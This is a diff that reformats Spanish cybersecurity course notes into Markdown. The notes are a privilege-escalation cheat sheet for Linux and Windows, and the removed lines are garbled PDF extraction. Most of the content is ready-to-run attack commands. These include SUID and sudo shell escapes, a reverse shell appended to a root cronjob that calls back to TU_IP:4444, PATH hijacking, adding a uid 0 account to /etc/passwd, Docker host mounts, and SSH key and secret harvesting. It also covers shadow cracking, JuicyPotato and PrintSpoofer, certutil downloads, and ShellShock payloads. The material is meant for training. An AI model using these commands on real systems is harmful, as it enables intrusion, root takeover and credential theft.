@@ -1,96 +1,210 @@
-Bloque
-06
+> [!info] Ficha técnica
+> **Programa:** Máster en Ciberseguridad — Evolve Academy
+> **Bloque:** 06 — Escalada de privilegios
+> **Contenido:** Checklist completa de comandos para Linux y Windows: SUID, cronjobs, sudo -l, capabilities, tokens, JuicyPotato y GTFOBins
 
-BL OQUE 6 · ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosChecklist completa de comandos para Linux y Windo ws: SUID , cr onjobs, sudo -l, capabilities, t ok ens, JuicyP otat o y 
-G TFOBins.6. 1 Esc alada Linux — Chulet a rápida paso a pasoP aso 0: C ont e xt o y est abilidadwhoami && id && uname -a && hostname && ip a
-script /dev/null -qc bashP aso 1: Enumeración esencial# SUID
+---
+
+## ① Escalada Linux — Chuleta rápida paso a paso
+
+### Paso 0: Contexto y estabilidad
+
+```bash
+whoami && id && uname -a && hostname && ip a
+script /dev/null -qc bash
+```
+
+### Paso 1: Enumeración esencial
+
+```bash
+# SUID
 find / -perm -4000 -type f 2>/dev/null
+
 # Cron
 crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron* 2>/dev/null
+
 # Sudo
 sudo -l 2>/dev/null
+
 # Procesos
 ps aux | grep -v '\['
+
 # Red y puertos locales
 ss -tulpn
+
 # Permisos "raros"
 find / -writable -type d 2>/dev/null | head
 find / -perm -2 -type d 2>/dev/null | grep -v proc | head
+
 # Archivos interesantes
 ls -la /root/ /home/*/ 2>/dev/null
 grep -R "password|secret|token" -n /etc 2>/dev/null | head
-NO T ASi t e atascas, lanza LinPEA S desde /tmp: r ecorr e sist emáticament e t odos est os v ect or es y r esalta los hallaz gos más 
-pr omet edor es.R ut a A : B inarios SUID → G TF OB insfind / -perm -4000 -type f 2>/dev/null
-# B usca el binario resultante ( vim , find , bash , less , tar , cp , awk , perl ,
-# python , openssl , mount ...) en https :// gtfobins . github . io
-# y aplica la tecnica "SUI D " indicada .
-# Ej emplo con find :
-find . -exec /bin/sh -p \; -quit22
+```
 
-BL OQUE 6 · ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosRut a B: sudo -lsudo -l
+> [!note] Nota
+> Si te atascas, lanza LinPEAS desde `/tmp`: recorre sistemáticamente todos estos vectores y resalta los hallazgos más prometedores.
+
+---
+
+## ② Rutas de escalada
+
+### Ruta A: Binarios SUID → GTFOBins
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+# Busca el binario resultante (vim, find, bash, less, tar, cp, awk, perl,
+# python, openssl, mount ...) en https://gtfobins.github.io
+# y aplica la técnica "SUID" indicada.
+# Ejemplo con find:
+find . -exec /bin/sh -p \; -quit
+```
+
+### Ruta B: sudo -l
+
+```bash
+sudo -l
 # Si aparece, por ejemplo:
 # (ALL) NOPASSWD: /usr/bin/vi /ruta/archivo.conf
 sudo /usr/bin/vi /ruta/archivo.conf
 # Dentro de vi:
-:set shell=/bin/bash:shell
-# Resultado: shell como rootRut a C: Cronjobs con rut as edit ablesgrep -R "run-parts" -n /etc/cron* 2>/dev/null
+:set shell=/bin/bash
+:shell
+# Resultado: shell como root
+```
+
+### Ruta C: Cronjobs con rutas editables
+
+```bash
+grep -R "run-parts" -n /etc/cron* 2>/dev/null
 echo 'bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"' >> /ruta/script.sh
 # Ponerse a la escucha en Kali:
-nc -lvnp 4444Rut a D: C apabilitiesgetcap -r / 2>/dev/null
+nc -lvnp 4444
+```
+
+### Ruta D: Capabilities
+
+```bash
+getcap -r / 2>/dev/null
 # Si aparece cap_setuid, cap_dac_read_search, etc. en python/perl/tar/openssl,
-# consulta GTFOBins la tecnica de "Capabilities" para ese binario.Rut a E: P A TH Hijackingecho '/bin/bash -p' > /tmp/ls && chmod +x /tmp/l s
-e x port PAT H =/tmp: $ PAT H # si un script root ejecuta 'ls' sin ruta absoluta
-23
+# consulta GTFOBins la técnica de "Capabilities" para ese binario.
+```
 
-BL OQUE 6 · ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosRut a F: Archiv os con permisos débilesfind /etc -type f -writable 2>/dev/null
+### Ruta E: PATH Hijacking
+
+```bash
+echo '/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls
+export PATH=/tmp:$PATH  # si un script root ejecuta 'ls' sin ruta absoluta
+```
+
+### Ruta F: Archivos con permisos débiles
+
+```bash
+find /etc -type f -writable 2>/dev/null
 ls -la /etc/passwd /etc/shadow
-# Si /etc/passwd es escribible, anadir usuario con nueva contrasena:
+# Si /etc/passwd es escribible, añadir usuario con nueva contraseña:
 openssl passwd -6 'nueva_pass'
-# Copiar el hash resultante y anadir linea a /etc/passwd con uid/gid 0Rut a G: NFS con no_roo t_squash y grupo Dock er# NFS: compilar un binario SUID en el cliente, copiarlo al share,
-# ejecutarlo en el servidor.
-# Docker: si el usuario esta en el grupo docker:
-id
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh6.2 Credenciales y hashes: recuperar y abusar# Claves SSH
-find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
-cat id_rsa # copiar tal cual, incluidas lineas BEGIN/END
-chmod 600 id_rsa
-ssh -i id_rsa usuario@IP# Configs con secreto s
-grep - R "password | passwd | secret | token" -n /opt /var/www /home /etc \
- 2>/dev/null | head
-# Crackear /etc/shadow si es legibl e
-john --wordlist = /usr/share/wordlists/rockyou . t x t hashes . t xt
-# Generar hash S HA - 51 2 crypt ( formato $ 6 $ S ALT$HA S H)
-mkpasswd -m sha- 51 2 'nueva_pass'
-2 4
+# Copiar el hash resultante y añadir línea a /etc/passwd con uid/gid 0
+```
 
-BL OQUE 6 · ESC AL AD A DE PRIVILEGIOSEsc alada de privilegios6.3 P ost-roo t: higiene y v erific aciónwhoami && id
+### Ruta G: NFS con no_root_squash y grupo Docker
+
+```bash
+# NFS: compilar un binario SUID en el cliente, copiarlo al share,
+# ejecutarlo en el servidor.
+# Docker: si el usuario está en el grupo docker:
+id
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+---
+
+## ③ Credenciales y hashes: recuperar y abusar
+
+```bash
+# Claves SSH
+find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
+cat id_rsa  # copiar tal cual, incluidas líneas BEGIN/END
+chmod 600 id_rsa
+ssh -i id_rsa usuario@IP
+
+# Configs con secretos
+grep -R "password|passwd|secret|token" -n /opt /var/www /home /etc \
+  2>/dev/null | head
+
+# Crackear /etc/shadow si es legible
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Generar hash SHA-512 crypt (formato $6$SALT$HASH)
+mkpasswd -m sha-512 'nueva_pass'
+```
+
+---
+
+## ④ Post-root: higiene y verificación
+
+```bash
+whoami && id
 cat /root/root.txt
 cat ~/.bash_history 2>/dev/null
-ls -la /root/ /var/backups/ 2>/dev/null6.4 Esc alada en Windo ws: modelo de seguridad y t ok ensEl comando whoami /priv muestra los privilegios habilitados del usuario actual. SeImpersonat ePrivilege es uno de los 
-más r ele v ant es: permit e a un pr oceso "impersonar" a otr o usuario, y en un cont e xt o vulnerable se puede encadenar 
-hasta con v er tirse en NT AUTHORITY\SYSTEM.whoami /priv
-systeminfo # version exacta y arquitectura antes de elegir herramienta
+ls -la /root/ /var/backups/ 2>/dev/null
+```
+
+---
+
+## ⑤ Escalada en Windows: modelo de seguridad y tokens
+
+El comando `whoami /priv` muestra los privilegios habilitados del usuario actual. **SeImpersonatePrivilege** es uno de los más relevantes: permite a un proceso "impersonar" a otro usuario, y en un contexto vulnerable se puede encadenar hasta convertirse en `NT AUTHORITY\SYSTEM`.
+
+```bash
+whoami /priv
+systeminfo  # versión exacta y arquitectura antes de elegir herramienta
+
 # En sistemas modernos con SeImpersonatePrivilege:
-# JuicyPotato (hasta Windows 10 / Server 2016, requiere CLSID valido)
+# JuicyPotato (hasta Windows 10 / Server 2016, requiere CLSID válido)
 JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
- -a "/c whoami > C:\out.txt" -t * -c {CLSID}
-# PrintSpoofer (alternativa mas moderna, no requiere CLSID)
-PrintSpoofer.exe -i -c cmdEn sist emas muy antiguos (Windo ws Ser v er 2003), Churrasco e xplota un CVE específico de esa época (v er el 
-walkt hr ough complet o de Grann y en el Bloque 5 , con comandos paso a paso ).6. 5 T rans f erencia de archiv os en Windo wsA dif er encia de L inux, Windo ws no siempr e tiene curl/w get disponibles por def ect o. Alt ernativ as prácticas:# certutil (puede ser detectado por Windows Defender en sistemas modernos)
-certutil -urlcache -split -f http: //TU _IP/archivo.exe archivo.ex e
+  -a "/c whoami > C:\out.txt" -t * -c {CLSID}
+
+# PrintSpoofer (alternativa más moderna, no requiere CLSID)
+PrintSpoofer.exe -i -c cmd
+```
+
+> [!note] Sistemas antiguos
+> En sistemas muy antiguos (Windows Server 2003), **Churrasco** explota un CVE específico de esa época (ver el walkthrough completo de GrannY en el Bloque 5, con comandos paso a paso).
+
+---
+
+## ⑥ Transferencia de archivos en Windows
+
+A diferencia de Linux, Windows no siempre tiene curl/wget disponibles por defecto. Alternativas prácticas:
+
+```bash
+# certutil (puede ser detectado por Windows Defender en sistemas modernos)
+certutil -urlcache -split -f http://TU_IP/archivo.exe archivo.exe
+
 # PowerShell
-Invoke-Web R equest - U ri http: //TU _IP/archivo.exe - O ut F ile archivo.ex e
-IW R http: //TU _IP/archivo.exe - O ut F ile archivo.ex e
-# Servidor HTT P en K ali para servir archivo s
-python3 -m http.server 8 06.6 C asos p r á cticos tra b a j ados: p a trones a reconocer25
+Invoke-WebRequest -Uri http://TU_IP/archivo.exe -OutFile archivo.exe
+IWR http://TU_IP/archivo.exe -OutFile archivo.exe
 
-BL OQUE 6 · ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosCr onjob in visible + plugin vulnerable de W or dPr ess: un cr onjob que se ejecuta con permisos ele v ados sobr e un 
-plugin desactualizado permit e in y ectar código que se ejecuta en el siguient e ciclo.ShellShock: vulnerabilidad hist órica en Bash que permit e ejecutar comandos a tra v és de v ariables de ent orno mal 
-saneadas — pa yload típico: () { :; }; comando_ malicioso en una cabecera HTTP pr ocesada por un script CGI.Blind Command Injection: no se v e la salida del comando per o se confirma su ejecución por tiempos de r espuesta 
-(pa yload típico: ; sleep 10 y medir el r etraso ).LXD /cont enedor es: per t enecer al grupo lx d permit e cr ear un cont enedor privilegiado que monta el disco del host, 
-dando acceso de escritura como r oot al sist ema de ar chiv os complet o.
-26
+# Servidor HTTP en Kali para servir archivos
+python3 -m http.server 80
+```
 
-→
+---
+
+## ⑦ Casos prácticos trabajados: patrones a reconocer
+
+### Cronjob invisible + plugin vulnerable de WordPress
+Un cronjob que se ejecuta con permisos elevados sobre un plugin desactualizado permite inyectar código que se ejecuta en el siguiente ciclo.
+
+### ShellShock
+Vulnerabilidad histórica en Bash que permite ejecutar comandos a través de variables de entorno mal saneadas — payload típico: `() { :; }; comando_malicioso` en una cabecera HTTP procesada por un script CGI.
+
+### Blind Command Injection
+No se ve la salida del comando pero se confirma su ejecución por tiempos de respuesta (payload típico: `; sleep 10` y medir el retraso).
+
+### LXD / contenedores
+Pertenecer al grupo `lxd` permite crear un contenedor privilegiado que monta el disco del host, dando acceso de escritura como root al sistema de archivos completo.
+
+---
 
 →
